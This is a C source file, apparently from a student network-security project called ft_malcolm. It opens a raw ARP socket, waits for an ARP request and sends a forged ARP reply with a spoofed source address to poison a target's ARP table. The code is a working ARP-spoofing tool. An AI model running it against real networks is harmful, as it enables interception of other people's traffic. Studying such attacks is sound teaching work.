/* ************************************************************************ */
/*   packet.c                                                               */
/*                                                         ___  ___ _____   */
/*                                                         |  \/  |/  __ \  */
/*                                                         | .  . || /  \/  */
/*  By: Mayara Carvalho <mayaracarvalhomk@gmail.com>       | |\/| || |      */
/*                                                         | |  | || \__/\  */
/*  Created: 2025/09/18 18:15:42 by Mayara Carvalho        \_|  |_/ \____/  */
/*                                                                          */
/*                                                                          */
/* ************************************************************************ */

#include "ft_malcolm.h"

void	connection(void)
{
	g_data.info.sock_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

	if (g_data.info.sock_fd < 0)
		fatal_error("Failed to get socket descriptor!");
}

int	receive_packet (void)
{
	char				buffer[1024];
	struct sockaddr_ll	client_addr;
	socklen_t			addr_len;
	ssize_t				bytes;
	int					received;

	addr_len = sizeof(client_addr);
	bytes = recvfrom(g_data.info.sock_fd, buffer, sizeof(buffer), 0,
			(struct sockaddr *)&client_addr, &addr_len);

	if (bytes == -1)
		fatal_error("Failed to receive packet!");

	received = print_request(bytes, buffer);

	return(received);
}

void	send_packet(void)
{
	u_int8_t			frame[ETH_LEN + sizeof(t_arp)];
	struct sockaddr_ll	device;

	setup_device(&device);
	setup_packet();

	ft_memcpy(frame, &g_data.eth, ETH_LEN);
	ft_memcpy(frame + ETH_LEN, &g_data.arp, sizeof(t_arp));

	printf("Now sending an ARP reply to the target address ");
	printf("with spoofed source, please wait...");

	if (sendto(g_data.info.sock_fd, &frame, sizeof(frame), 0,
			(struct sockaddr *)&device, sizeof(device)) < 0)
		fatal_error("Failed to send ARP packet!");

	printf("Sent an ARP reply packet, you may now check the ");
	printf("arp table on the target.");
}

void	setup_device(struct sockaddr_ll	*device)
{
	ft_memset(device, 0, sizeof(struct sockaddr_ll));
	device->sll_family = AF_PACKET;
	device->sll_protocol = htons(ETH_P_ARP);
	device->sll_ifindex = get_index_if();
	device->sll_halen = ETH_ALEN;
	ft_memcpy(device->sll_addr, g_data.info.target_mac, ETH_ALEN * sizeof(uint8_t));
}

void	setup_packet(void)
{
	g_data.arp.htype = htons(ARPHRD_ETHER);
	g_data.arp.ptype = htons(ETHERTYPE_IP);
	g_data.arp.hlen = ETH_ALEN;
	g_data.arp.plen = INET4_LEN;
	g_data.arp.opcode = htons(ARPOP_REPLY);

	ft_memcpy(g_data.arp.sender_mac, g_data.info.source_mac, ETH_ALEN);
	ft_memcpy(g_data.arp.sender_ip, g_data.info.source_ip, INET4_LEN);
	ft_memcpy(g_data.arp.target_mac, g_data.info.target_mac, ETH_ALEN);
	ft_memcpy(g_data.arp.target_ip, g_data.info.target_ip, INET4_LEN);

	g_data.eth.ethertype = htons(ETHERTYPE_ARP);
	ft_memcpy(g_data.eth.dst_mac, g_data.info.target_mac, ETH_ALEN);
	ft_memcpy(g_data.eth.src_mac, g_data.info.source_mac, ETH_ALEN);


}
